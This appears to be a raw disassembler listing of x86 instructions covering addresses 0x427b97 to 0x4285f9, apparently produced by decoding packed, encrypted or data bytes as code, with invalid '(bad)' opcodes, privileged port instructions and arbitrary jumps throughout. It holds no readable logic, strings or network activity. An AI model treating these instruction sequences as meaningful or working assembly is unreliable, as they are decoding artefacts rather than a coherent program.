  427b97:	cmp    dl,al
  427b99:	or     cl,bl
  427b9b:	mov    ecx,0x712c922e
  427ba0:	jmp    FWORD PTR [edx+0x2cadc9a4]
  427ba6:	repnz inc ebx
  427ba8:	adc    al,0xd2
  427baa:	lods   eax,DWORD PTR ds:[esi]
  427bab:	rcl    ah,cl
  427bad:	aas    
  427bae:	aas    
  427baf:	in     eax,dx
  427bb0:	xor    DWORD PTR [edx+ebx*1-0x71cac0dd],esp
  427bb7:	test   al,0xb6
  427bb9:	adc    BYTE PTR [eax],0x30
  427bbc:	iret   
  427bbd:	enter  0x90a0,0xc2
  427bc1:	out    0xd1,al
  427bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bc4:	or     eax,0x560d654f
  427bc9:	nop
  427bca:	inc    ebp
  427bcb:	xchg   edi,eax
  427bcc:	ret    
  427bcd:	mov    al,ds:0xe62777f2
  427bd2:	mov    eax,ds:0xbf00fbf8
  427bd7:	and    dh,BYTE PTR [edi+0x2c]
  427bda:	mov    bh,0xe4
  427bdc:	push   edx
  427bdd:	mov    ecx,0xc37636dd
  427be2:	and    edx,eax
  427be4:	cli    
  427be5:	cdq    
  427be6:	push   ss
  427be7:	inc    ebp
  427be8:	jp     0x427bf2
  427bea:	shl    DWORD PTR [ebp+0x5a],1
  427bed:	arpl   ax,si
  427bef:	in     eax,0x1c
  427bf1:	mov    esp,0xf111780b
  427bf6:	loope  0x427b88
  427bf8:	nop
  427bf9:	jae    0x427bd8
  427bfb:	in     al,dx
  427bfc:	(bad)  
  427bfd:	mov    ah,0xb4
  427bff:	sub    ebx,DWORD PTR [ebp+0x24]
  427c02:	pop    esi
  427c03:	stos   DWORD PTR es:[edi],eax
  427c04:	xchg   bl,bl
  427c06:	adc    ch,bl
  427c08:	popa   
  427c09:	lahf   
  427c0a:	sbb    ah,BYTE PTR [ecx+0xd0677bf]
  427c10:	cmp    al,0xb2
  427c12:	sbb    DWORD PTR ss:[edx-0x10],0x47cc8850
  427c1a:	inc    ecx
  427c1b:	pusha  
  427c1c:	add    BYTE PTR [esi+eax*8],0x3a
  427c20:	jae    0x427c45
  427c22:	cmp    eax,0xa299bc29
  427c27:	pop    ds
  427c28:	and    eax,0x351220d5
  427c2d:	fdiv   QWORD PTR [edx+0x59]
  427c30:	jp     0x427c84
  427c32:	mov    eax,DWORD PTR [ebp+0x1c]
	...
  427c94:	add    BYTE PTR [eax],al
  427c96:	mov    ds:0xf343b050,eax
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0x39755085
  427ca5:	retf   0xa8b9
  427ca8:	add    DWORD PTR [eax],eax
  427caa:	pop    es
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    BYTE PTR [ebp-0xb8c517e],bh
  427cb3:	or     DWORD PTR [edx],0x121e723f
  427cb9:	jp     0x427c4d
  427cbb:	mov    ch,0xf1
  427cbd:	jle    0x427ce8
  427cbf:	sbb    eax,0xf4879172
  427cc4:	push   ebx
  427cc5:	xor    al,0xf4
  427cc7:	test   esp,edi
  427cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cca:	outs   dx,DWORD PTR ds:[esi]
  427ccb:	xchg   edx,eax
  427ccc:	fstp   QWORD PTR [esp+eax*1]
  427ccf:	scas   al,BYTE PTR es:[edi]
  427cd0:	fiadd  WORD PTR [ebp-0x2]
  427cd3:	(bad)  
  427cd4:	clc    
  427cd5:	cmp    ebp,0x1172baa
  427cdb:	and    DWORD PTR [ebp-0x67ab0c03],edi
  427ce1:	cmp    BYTE PTR [ebx+ebp*2],bh
  427ce4:	sbb    eax,0xde0dd72
  427ce9:	push   ebx
  427cea:	pop    esi
  427ceb:	pop    ds
  427cec:	mov    esp,0xae211993
  427cf1:	xchg   ebp,eax
  427cf2:	mov    ebp,0xab526437
  427cf7:	add    eax,0xa4e28973
  427cfc:	rol    BYTE PTR [esi+0x6babaf28],0xf5
  427d03:	mov    ebp,0x9310c6f2
  427d08:	jb     0x427d20
  427d0a:	pop    edx
  427d0b:	mov    ds:0x1245fb02,eax
  427d10:	pop    ebx
  427d11:	mov    bl,0xda
  427d13:	mov    dh,0x4b
  427d15:	sub    bl,BYTE PTR [ecx]
  427d17:	or     eax,0xf19be01a
  427d1c:	inc    esi
  427d1d:	jmpw   0x4555
  427d21:	mov    bh,0x4c
  427d23:	cmp    eax,0x87382201
  427d28:	push   ss
  427d29:	jo     0x427d90
  427d2b:	retf   0x330c
  427d2e:	jmp    0x29d280d0
  427d33:	inc    ebp
  427d34:	or     DWORD PTR [edi+0x67],edx
  427d37:	adc    DWORD PTR [eax],ebx
  427d39:	les    edx,FWORD PTR [eax+0x64]
  427d3c:	dec    eax
  427d3d:	call   0xe128584f
  427d42:	jmp    0x427d80
  427d44:	out    dx,al
  427d45:	scas   eax,DWORD PTR es:[edi]
  427d46:	outs   dx,DWORD PTR ds:[esi]
  427d47:	dec    esi
  427d48:	aas    
  427d49:	(bad)  
  427d4a:	mov    dl,0x8a
  427d4c:	(bad)  
  427d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d4e:	loop   0x427cdf
  427d50:	cmp    eax,0x2ea9a097
  427d55:	mov    dh,0xbc
  427d57:	lds    esi,FWORD PTR [ebp*8-0xc6f8d5]
  427d5e:	xchg   edx,eax
  427d5f:	cmp    ah,BYTE PTR [edx-0x3eb5f888]
  427d65:	aaa    
  427d66:	mov    al,ds:0x72fd09f4
  427d6b:	sbb    ecx,DWORD PTR [edx+edi*1+0x497e809a]
  427d72:	and    DWORD PTR [esi-0x4bf120c6],esi
  427d78:	ins    BYTE PTR es:[edi],dx
  427d79:	adc    ah,BYTE PTR [edi+0x11]
  427d7c:	xchg   ecx,eax
  427d7d:	cmp    BYTE PTR ss:[ebx],dl
  427d80:	mov    ds:0x10591bf4,eax
  427d85:	adc    eax,0x81860d1e
  427d8a:	pop    esi
  427d8b:	ret    
  427d8c:	push   ss
  427d8d:	ss (bad) 
  427d8f:	sbb    ch,BYTE PTR [eax]
  427d91:	pop    ebp
  427d92:	mov    ebx,0x1e64fd9d
  427d97:	jmp    0x5e92d8f
  427d9c:	push   ecx
  427d9d:	dec    eax
  427d9e:	sar    DWORD PTR [eax-0x5f173933],cl
  427da4:	push   ss
  427da5:	scas   al,BYTE PTR es:[edi]
  427da6:	cwde   
  427da7:	push   ebp
  427da8:	(bad)  
  427daa:	aad    0xd5
  427dac:	jp     0x427df4
  427dae:	or     eax,0x50c5b30f
  427db3:	add    BYTE PTR [edi],0x0
	...
  427e16:	mov    eax,0x6d3c25f1
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [edx-0x3f543acc],cl
  427e27:	test   eax,0x1070001
  427e2c:	add    BYTE PTR [eax],al
  427e2e:	mov    ebx,0x4c6fab96
  427e33:	push   cs
  427e34:	sub    dl,BYTE PTR [ebx+esi*8]
  427e37:	fmul   DWORD PTR [eax+edx*2+0x6bf0e249]
  427e3e:	sti    
  427e3f:	pop    ds
  427e40:	(bad)  [esi-0x5df75a2]
  427e46:	dec    ecx
  427e47:	push   0xffffffa9
  427e49:	mov    ebp,esi
  427e4b:	mov    ebp,0xe4b58221
  427e50:	mov    eax,0x735bf046
  427e55:	mov    bh,0x84
  427e57:	inc    DWORD PTR [ecx-0x5a]
  427e5a:	adc    dl,bl
  427e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e5e:	sub    ecx,DWORD PTR [edi]
  427e60:	imul   edi,DWORD PTR [edx-0x9],0xffffffcd
  427e64:	test   edi,eax
  427e66:	data16 (bad) 
  427e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e69:	xchg   DWORD PTR ds:0xe7dca47e,edi
  427e6f:	mov    BYTE PTR [eax],0xb1
  427e72:	pop    ebp
  427e73:	mov    ebx,0x9befa0b5
  427e78:	jl     0x427e86
  427e7a:	sahf   
  427e7b:	ja     0x427ebe
  427e7d:	shl    DWORD PTR [ebx+edi*4],cl
  427e80:	xor    ah,BYTE PTR [ecx-0x7cf73d73]
  427e86:	icebp  
  427e87:	lods   al,BYTE PTR ds:[esi]
  427e88:	iret   
  427e89:	enter  0x9fd9,0x18
  427e8d:	retf   
  427e8e:	dec    esp
  427e8f:	dec    edx
  427e90:	fmul   QWORD PTR [esi+0x16]
  427e93:	xchg   ebp,eax
  427e94:	xchg   ebx,eax
  427e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e96:	pushf  
  427e97:	lea    ebx,[eax+0x232cca05]
  427e9d:	into   
  427e9e:	jns    0x427ef1
  427ea0:	mov    bl,0x90
  427ea2:	push   ss
  427ea3:	pusha  
  427ea4:	(bad)  
  427ea5:	clc    
  427ea6:	fnstenv [ecx+0x4d02d25d]
  427eac:	cmp    eax,0x38c6074c
  427eb1:	xchg   edi,eax
  427eb2:	icebp  
  427eb3:	das    
  427eb4:	mov    eax,0x543c0758
  427eb9:	imul   bh
  427ebb:	push   cs
  427ebc:	bound  esp,QWORD PTR [ebx-0x2134ecbd]
  427ec2:	fsubr  st,st(5)
  427ec4:	nop
  427ec5:	iret   
  427ec6:	xchg   ebx,eax
  427ec7:	je     0x427eeb
  427ec9:	or     al,0x64
  427ecb:	sub    BYTE PTR [edi-0xc],dl
  427ece:	test   eax,0x9748b2f0
  427ed3:	xchg   ecx,eax
  427ed4:	cmp    al,0x28
  427ed6:	xchg   edx,eax
  427ed7:	mov    ds:0xbf1b6f69,eax
  427edc:	ins    BYTE PTR es:[edi],dx
  427edd:	mov    eax,ds:0xf80adf63
  427ee2:	hlt    
  427ee3:	sbb    eax,0x8a89f253
  427ee8:	ror    DWORD PTR [ecx-0x591f5dbf],0x47
  427eef:	(bad)  
  427ef0:	addr16 adc ebp,esp
  427ef3:	lds    eax,FWORD PTR [edi]
  427ef5:	cmp    DWORD PTR [ecx+0x6],0x1c
  427ef9:	mov    WORD PTR [bp+si],es
  427efc:	xchg   edi,eax
  427efd:	dec    edi
  427efe:	sub    al,0x52
  427f00:	scas   eax,DWORD PTR es:[edi]
  427f01:	fcomp  DWORD PTR [esi+0x521828d9]
  427f07:	inc    eax
  427f08:	or     DWORD PTR [eax],0x19b3ca80
  427f0e:	in     eax,dx
  427f0f:	(bad)  
  427f10:	dec    esi
  427f11:	adc    BYTE PTR [edi-0x28],ch
  427f14:	push   0xa
  427f16:	mov    esi,0x844b5bcc
  427f1b:	pop    es
  427f1c:	stos   BYTE PTR es:[edi],al
  427f1d:	inc    edi
  427f1e:	or     ah,BYTE PTR [ecx-0x36]
  427f21:	xchg   DWORD PTR [edx+edi*8],edx
  427f24:	test   BYTE PTR [edi-0x7c],ah
  427f27:	mov    edi,0x5facd668
  427f2c:	adc    BYTE PTR [edx],ah
  427f2e:	inc    esp
  427f2f:	xchg   ebp,eax
  427f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f31:	pop    ebx
  427f32:	or     DWORD PTR ds:0xc1,edi
	...
  427f94:	add    BYTE PTR [eax],al
  427f96:	mov    cl,0xa7
  427f98:	dec    ebx
  427f99:	das    
  427f9a:	pop    edi
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	inc    eax
  427fa3:	clc    
  427fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427fa5:	arpl   di,ax
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    BYTE PTR [ebx],bl
  427faf:	in     eax,0x13
  427fb1:	shl    DWORD PTR [edi+eiz*2+0x1],cl
  427fb5:	imul   ecx,DWORD PTR [ebx+ecx*1],0x1bf8b1b7
  427fbc:	(bad)  
  427fbd:	icebp  
  427fbe:	ds mov cl,0x7e
  427fc1:	cmp    BYTE PTR [edx],al
  427fc3:	mov    ?,ecx
  427fc5:	fcom   st(4)
  427fc7:	mov    eax,ds:0x542786a2
  427fcc:	and    dl,bh
  427fce:	jae    0x427f8f
  427fd0:	or     BYTE PTR [eax+0x6e53ea51],0x90
  427fd7:	mov    esi,?
  427fd9:	sub    al,0x8b
  427fdb:	mov    ds:0x8cc48b9c,eax
  427fe0:	shl    BYTE PTR [ebx-0x57911838],0xe0
  427fe7:	pop    ebp
  427fe8:	or     BYTE PTR [edx],dh
  427fea:	dec    BYTE PTR [edi-0x41]
  427fed:	mov    ebp,0x862d668a
  427ff2:	add    al,0xdf
  427ff4:	das    
  427ff5:	push   esi
  427ff6:	fistp  WORD PTR [ebx-0x6a]
  427ff9:	aad    0x9a
  427ffb:	loop   0x427ffd
  427ffd:	mov    ah,0xfa
  427fff:	inc    edx
  428000:	adc    BYTE PTR [edx-0x4e],bl
  428003:	fs ins DWORD PTR es:[edi],dx
  428005:	bound  edi,QWORD PTR [edi]
  428007:	mov    sp,0x3660
  42800b:	icebp  
  42800c:	push   0x135fcdb2
  428011:	or     al,0x28
  428013:	dec    ebx
  428014:	push   esi
  428015:	push   cs
  428016:	dec    ebx
  428017:	retf   
  428018:	in     eax,dx
  428019:	mov    al,ds:0x33bc4c9b
  42801e:	pop    ecx
  42801f:	and    ch,BYTE PTR [esi-0x75e8137a]
  428025:	pop    esi
  428026:	ret    
  428027:	inc    esi
  428028:	xchg   ecx,eax
  428029:	fild   DWORD PTR [ebp+0x25]
  42802c:	ficomp WORD PTR [ebp+ebx*2+0x4e65baec]
  428033:	repz fadd st,st(0)
  428036:	sub    eax,0xebe1a69
  42803b:	cmp    BYTE PTR [ecx+0x62],cl
  42803e:	and    cl,ch
  428040:	xchg   BYTE PTR [ecx-0x3e],ch
  428043:	lock adc edx,edx
  428046:	jmp    0x4280ba
  428048:	sub    al,0x7a
  42804a:	cmc    
  42804b:	jne    0x428002
  42804d:	ins    BYTE PTR es:[edi],dx
  42804e:	rol    BYTE PTR [bx+di-0x7a82],cl
  428053:	in     al,0xce
  428055:	cmp    DWORD PTR [edx-0x6aaded09],edi
  42805b:	push   0xf35654b2
  428060:	ret    0xf8c
  428063:	arpl   WORD PTR [edx+0x17d1b81d],dx
  428069:	pushf  
  42806a:	retf   
  42806b:	ffree  st(3)
  42806d:	cmp    al,0x94
  42806f:	std    
  428070:	push   ds
  428071:	dec    esp
  428072:	test   DWORD PTR [ecx-0x790ff09f],esp
  428078:	push   cs
  428079:	int    0x80
  42807b:	stc    
  42807c:	mov    eax,0x4761363d
  428081:	fstp   DWORD PTR [ecx]
  428083:	jae    0x428040
  428085:	sub    ah,BYTE PTR [ecx]
  428087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428088:	push   edi
  428089:	imul   eax,DWORD PTR [ecx+0x4d],0xffffffe1
  42808d:	call   0x970f14b2
  428092:	jns    0x42802c
  428094:	sub    BYTE PTR [ecx-0x71],0x37
  428098:	aam    0x0
  42809a:	fstp   QWORD PTR [edx]
  42809c:	mov    dh,0xbb
  42809e:	sahf   
  42809f:	fsubr  DWORD PTR [edi]
  4280a1:	mov    ch,BYTE PTR [eax+edi*1]
  4280a4:	mov    ds:0x3a88c122,eax
  4280a9:	cld    
  4280aa:	repnz dec ecx
  4280ac:	jo     0x42812a
  4280ae:	addr16 cld 
  4280b0:	retf   0xdf6a
  4280b3:	inc    esp
  4280b4:	test   al,0x0
	...
  428116:	fucomip st,st(6)
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	sbb    edi,edx
  428124:	xor    edi,esi
  428126:	into   
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [ebx-0x7c],dh
  428130:	aad    0xa
  428132:	stos   BYTE PTR es:[edi],al
  428133:	or     eax,0xd38f7d19
  428138:	faddp  st(0),st
  42813a:	and    eax,0x27729afc
  42813f:	cmp    BYTE PTR [edi-0x48f15ab5],ch
  428145:	add    eax,0x36d1a955
  42814a:	cmp    DWORD PTR [edi+0x32],0x738858e
  428151:	mov    bh,0xeb
  428153:	lods   al,BYTE PTR ds:[esi]
  428154:	push   0x30
  428156:	pop    edx
  428157:	shr    BYTE PTR [ebx-0x38e97766],1
  42815d:	cli    
  42815e:	fwait
  42815f:	pop    eax
  428160:	push   edx
  428161:	aam    0x4a
  428163:	iret   
  428164:	cmp    BYTE PTR [edi-0xc5ed1fa],0x5a
  42816b:	repz cld 
  42816d:	adc    BYTE PTR ds:0xdc565e77,0x3c
  428174:	jl     0x4281cf
  428176:	mov    es,WORD PTR [edx+0x7d]
  428179:	dec    ebx
  42817a:	rcl    DWORD PTR [edx-0x61],1
  42817d:	or     eax,0x40225fc
  428182:	js     0x4281cb
  428184:	sub    ch,BYTE PTR [edi+0x18]
  428187:	rcr    DWORD PTR [eax+0x57b242d],0xce
  42818e:	stos   DWORD PTR es:[edi],eax
  42818f:	mov    al,0xbf
  428191:	cli    
  428192:	enter  0x2a33,0xc0
  428196:	cs sbb al,ch
  428199:	cmc    
  42819a:	out    dx,al
  42819b:	test   DWORD PTR [ecx+ebx*4+0x75],ecx
  42819f:	ret    
  4281a0:	push   esp
  4281a1:	ins    BYTE PTR es:[edi],dx
  4281a2:	mov    eax,0xb408d264
  4281a7:	pusha  
  4281a8:	ret    
  4281a9:	add    al,0xd9
  4281ab:	test   eax,0x7dc889d7
  4281b0:	(bad)  
  4281b1:	cld    
  4281b2:	dec    esp
  4281b3:	hlt    
  4281b4:	mov    dl,0x65
  4281b6:	pop    ss
  4281b7:	sbb    edi,DWORD PTR [edi-0xd08ec19]
  4281bd:	jl     0x428161
  4281bf:	adc    BYTE PTR ds:0x4b837014,bl
  4281c5:	stos   BYTE PTR es:[edi],al
  4281c6:	inc    ecx
  4281c7:	stc    
  4281c8:	or     eax,0x373abaa8
  4281cd:	sub    esi,DWORD PTR [ebp+0x12233f1f]
  4281d3:	shl    DWORD PTR [edx-0x53716d0c],0xbd
  4281da:	sub    eax,0xad7c435b
  4281df:	dec    ebx
  4281e0:	mov    bh,0xa7
  4281e2:	ss std 
  4281e4:	test   al,0x4c
  4281e6:	jbe    0x428266
  4281e8:	mov    ch,BYTE PTR [edx+0x1697e72a]
  4281ee:	mov    dl,0xac
  4281f0:	and    al,0x5f
  4281f2:	dec    ebp
  4281f3:	sbb    BYTE PTR [edx],dh
  4281f5:	jne    0x42817d
  4281f7:	and    ch,al
  4281f9:	mov    ch,0x74
  4281fb:	xchg   edi,eax
  4281fc:	dec    ecx
  4281fd:	daa    
  4281fe:	mov    cl,BYTE PTR [esi+edi*2]
  428201:	mov    ecx,0xac844073
  428206:	pusha  
  428207:	pop    ds
  428208:	jo     0x428257
  42820a:	das    
  42820b:	sub    al,0x57
  42820e:	add    DWORD PTR [edi],eax
  428210:	mov    edi,0xc5f9ebb5
  428215:	add    bh,bl
  428217:	addr16 and eax,0x646a1821
  42821d:	test   BYTE PTR [ebx+edx*8-0x7cfc5119],dl
  428224:	sbb    DWORD PTR [ecx-0x19],eax
  428227:	hlt    
  428228:	sub    ecx,ebp
  42822a:	mov    ?,esp
  42822c:	mov    eax,ds:0xc2c786ab
  428231:	je     0x4282aa
  428233:	test   bh,bh
	...
  428295:	add    bh,al
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	out    dx,eax
  4282a3:	cmp    esp,DWORD PTR [edi+0x4f]
  4282a6:	aad    0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [esi-0x4e37d3c],ah
  4282b3:	sub    ebx,ecx
  4282b5:	jg     0x428280
  4282b7:	sti    
  4282b8:	loop   0x428302
  4282ba:	hlt    
  4282bb:	stos   BYTE PTR es:[edi],al
  4282bc:	retf   
  4282bd:	cmp    bl,cl
  4282bf:	push   edx
  4282c0:	adc    al,0x7c
  4282c2:	std    
  4282c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282c4:	mov    dh,0xfb
  4282c6:	ss out 0x1c,eax
  4282c9:	pop    ebp
  4282ca:	push   ebx
  4282cb:	nop
  4282cc:	mov    DWORD PTR [ebp-0x62a1d74a],esi
  4282d2:	fadd   QWORD PTR [edi]
  4282d4:	neg    DWORD PTR [edx-0x2ed17df0]
  4282da:	fimul  DWORD PTR [eax+esi*2+0x3f]
  4282de:	and    BYTE PTR [esp+eax*1],ah
  4282e1:	test   DWORD PTR [edi-0x1a],esp
  4282e4:	push   0xffffff8b
  4282e6:	inc    esp
  4282e7:	lahf   
  4282e8:	push   DWORD PTR [edi+eax*2+0x585b3582]
  4282ef:	jge    0x428338
  4282f1:	mov    eax,0x83b11aef
  4282f6:	(bad)  
  4282f7:	iret   
  4282f8:	mov    edx,0x4d781049
  4282fd:	out    0x28,al
  4282ff:	dec    eax
  428300:	jp     0x428312
  428302:	pop    es
  428303:	and    BYTE PTR [ebx-0x6a],al
  428306:	adc    DWORD PTR [edx-0xa],edx
  428309:	xchg   DWORD PTR es:0x9702522,ecx
  428310:	cmp    DWORD PTR [eax],ebx
  428312:	mov    ch,dl
  428314:	retf   0x2dfa
  428317:	sub    eax,0xaea6d2aa
  42831c:	rol    DWORD PTR [ebx],1
  42831e:	push   edx
  42831f:	pop    eax
  428320:	out    0x33,al
  428322:	xor    eax,0xf1e18361
  428327:	pop    edx
  428328:	lods   al,BYTE PTR ds:[esi]
  428329:	pop    edi
  42832a:	cld    
  42832b:	shl    DWORD PTR [edx+0x1b0a0ae8],cl
  428331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428332:	sbb    al,0x1f
  428334:	leave  
  428335:	popf   
  428336:	xchg   esp,eax
  428337:	jno    0x428365
  428339:	ja     0x42837e
  42833b:	shl    DWORD PTR [ebx],1
  42833d:	adc    eax,DWORD PTR [ebx-0x4f]
  428340:	sbb    DWORD PTR [ecx],edi
  428342:	ja     0x4283c0
  428344:	adc    al,0x78
  428346:	jae    0x4283bf
  428348:	test   al,0xb
  42834a:	inc    ecx
  42834b:	lahf   
  42834c:	fwait
  42834d:	or     DWORD PTR es:[edx+0x5c],eax
  428351:	xchg   ebp,eax
  428352:	sub    esp,DWORD PTR [esi+eax*1]
  428355:	movzx  ecx,BYTE PTR [esi+0x29515c7d]
  42835c:	daa    
  42835d:	adc    eax,0xb48053b0
  428362:	dec    esp
  428363:	addr16 inc eax
  428365:	pop    ecx
  428366:	call   0x3535b939
  42836b:	and    DWORD PTR ds:0xb834f9be,esp
  428371:	sbb    eax,0x71beb1e1
  428376:	or     edx,DWORD PTR [ebp-0x540f7ccf]
  42837c:	sub    ebp,DWORD PTR [ebx-0x5c]
  42837f:	lahf   
  428380:	cmc    
  428381:	and    ecx,DWORD PTR [esi+0x36]
  428384:	mov    dl,0x61
  428386:	jmp    DWORD PTR [ebp-0x77]
  428389:	xchg   DWORD PTR [edi-0x662c15cf],edx
  42838f:	call   0xb2af0a81
  428394:	lock push edx
  428396:	mov    ecx,0xe93cc010
  42839b:	shl    BYTE PTR [ebx-0x77],cl
  42839e:	push   ecx
  42839f:	sub    cl,BYTE PTR [edx+0x35]
  4283a2:	jge    0x428372
  4283a4:	test   eax,0x1242337a
  4283a9:	frstor [esi-0x59]
  4283ac:	in     eax,dx
  4283ad:	ficomp WORD PTR [edi+ebx*2]
  4283b0:	lahf   
  4283b1:	loope  0x428369
  4283b3:	shr    BYTE PTR [ebx],0x0
	...
  428416:	push   cs
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	(bad)  
  428422:	sbb    eax,0xdcf363e5
  428427:	lods   eax,DWORD PTR ds:[esi]
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [eax-0x5f05347e],dh
  428433:	in     al,dx
  428434:	xchg   edx,eax
  428435:	hlt    
  428436:	push   esp
  428437:	add    BYTE PTR [edi+0x2ff887dc],dh
  42843d:	aam    0x81
  42843f:	int    0xc4
  428441:	jp     0x42849f
  428443:	ftst   
  428445:	jge    0x4284b1
  428447:	cs mov edx,0xe299540f
  42844d:	push   ss
  42844e:	mov    ecx,0xfae73b97
  428453:	out    dx,al
  428454:	das    
  428455:	mov    esi,0x8415e9a0
  42845a:	adc    BYTE PTR [ebx-0x2be23755],ch
  428460:	popf   
  428461:	shr    BYTE PTR [ebp+ebx*1+0x6b938ead],cl
  428468:	in     al,dx
  428469:	ja     0x42849b
  42846b:	cs pop ebx
  42846d:	dec    ecx
  42846e:	daa    
  42846f:	outs   dx,DWORD PTR ds:[esi]
  428470:	cwde   
  428471:	pop    es
  428472:	imul   edx,DWORD PTR [eax],0x0
  428475:	ret    
  428476:	pop    ecx
  428477:	or     al,0x98
  428479:	push   ebp
  42847a:	mov    ch,0xad
  42847c:	lock leave 
  42847e:	pop    ecx
  42847f:	dec    edi
  428480:	xor    DWORD PTR [ecx*8+0x73336b95],ecx
  428487:	jecxz  0x428438
  428489:	add    eax,0x65c3ad7b
  42848e:	bound  eax,QWORD PTR [esi]
  428490:	xchg   ebx,eax
  428491:	loop   0x42847e
  428493:	mov    al,ds:0x51a08230
  428498:	mov    ebx,0xbc492c3c
  42849d:	sbb    BYTE PTR [edi-0x6a],dl
  4284a0:	mov    al,0xf8
  4284a2:	fld    DWORD PTR [ebp*2-0x4d3e89b3]
  4284a9:	mov    esi,0xbc103620
  4284ae:	(bad)  
  4284af:	out    0x89,al
  4284b1:	cmp    eax,0xcb9690c2
  4284b6:	add    al,0x4b
  4284b8:	or     edi,esp
  4284ba:	dec    ebp
  4284bb:	rol    DWORD PTR [ebp+0xdfc7a09],cl
  4284c1:	repz sbb al,0x1d
  4284c4:	ins    DWORD PTR es:[edi],dx
  4284c5:	pop    ecx
  4284c6:	ja     0x428547
  4284c8:	mov    esp,0x5c7bd1d7
  4284cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284ce:	scas   al,BYTE PTR es:[edi]
  4284cf:	int    0x19
  4284d1:	and    ebx,DWORD PTR [ecx-0x23]
  4284d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284d5:	sub    ecx,DWORD PTR [edi]
  4284d7:	cmp    BYTE PTR [eax-0x32c6d647],cl
  4284dd:	cmc    
  4284de:	or     DWORD PTR [eax+ebp*8+0x35],0x61f0acf7
  4284e6:	cld    
  4284e7:	add    eax,0xd28dc046
  4284ec:	jmp    0x3c11:0x2e51a87a
  4284f3:	psrlq  mm0,QWORD PTR [edx-0x7a]
  4284f7:	mov    ebx,esi
  4284f9:	pop    esi
  4284fa:	(bad)  
  4284fb:	adc    al,BYTE PTR [eax*1-0x2d484a74]
  428502:	jbe    0x428525
  428504:	mov    BYTE PTR [edi-0x7d9304],al
  42850a:	jae    0x4284d4
  42850c:	aam    0xc5
  42850e:	add    BYTE PTR [edx],0xfe
  428511:	push   ss
  428512:	jns    0x4284ed
  428514:	imul   edi,DWORD PTR [edx],0xffffffa4
  428517:	push   edx
  428518:	and    esp,DWORD PTR [ebx-0xb]
  42851b:	ror    DWORD PTR [edi+esi*1-0x6d],1
  42851f:	ja     0x428525
  428521:	jnp    0x42854b
  428523:	sub    ah,dl
  428525:	xchg   ebx,eax
  428526:	push   es
  428527:	mov    esp,DWORD PTR [ebp-0x56d9bd3a]
  42852d:	dec    esi
  42852e:	push   ds
  42852f:	popf   
  428530:	js     0x4284bc
  428532:	aas    
  428533:	fadd   DWORD PTR [eax+0x0]
	...
  428596:	push   ecx
  428597:	div    BYTE PTR ds:0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	push   edi
  4285a3:	dec    edx
  4285a4:	int3   
  4285a5:	or     ebx,esp
  4285a7:	scas   al,BYTE PTR es:[edi]
  4285a8:	add    DWORD PTR [eax],eax
  4285aa:	pop    es
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [edx+0x13],dl
  4285b0:	fld    TBYTE PTR [edx]
  4285b2:	sbb    eax,DWORD PTR [esi+0x52]
  4285b5:	ss mov ch,0xc7
  4285b8:	cli    
  4285b9:	sahf   
  4285ba:	mov    bl,0xbb
  4285bc:	fst    QWORD PTR ds:0x37350c3c
  4285c2:	push   esi
  4285c3:	aaa    
  4285c4:	enter  0xbf6a,0xce
  4285c8:	std    
  4285c9:	sbb    ecx,eax
  4285cb:	push   ebp
  4285cc:	pop    es
  4285cd:	ja     0x42862c
  4285cf:	xor    al,BYTE PTR [edx+edx*2]
  4285d2:	inc    ebp
  4285d3:	and    BYTE PTR [esi-0x75ce9e87],cl
  4285d9:	int3   
  4285da:	test   al,0xfe
  4285dc:	fldcw  WORD PTR [edi-0x4e]
  4285df:	dec    edx
  4285e0:	ins    BYTE PTR es:[edi],dx
  4285e1:	mov    al,ds:0x11a1914c
  4285e6:	ins    BYTE PTR es:[edi],dx
  4285e7:	or     WORD PTR [edi+0x2],si
  4285eb:	mov    eax,0xdf248a27
  4285f0:	push   cs
  4285f1:	cmp    edi,ecx
  4285f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285f4:	or     al,0xc1
  4285f6:	std    
  4285f7:	lahf   
  4285f8:	scas   eax,DWORD PTR es:[edi]
  4285f9:	pusha  
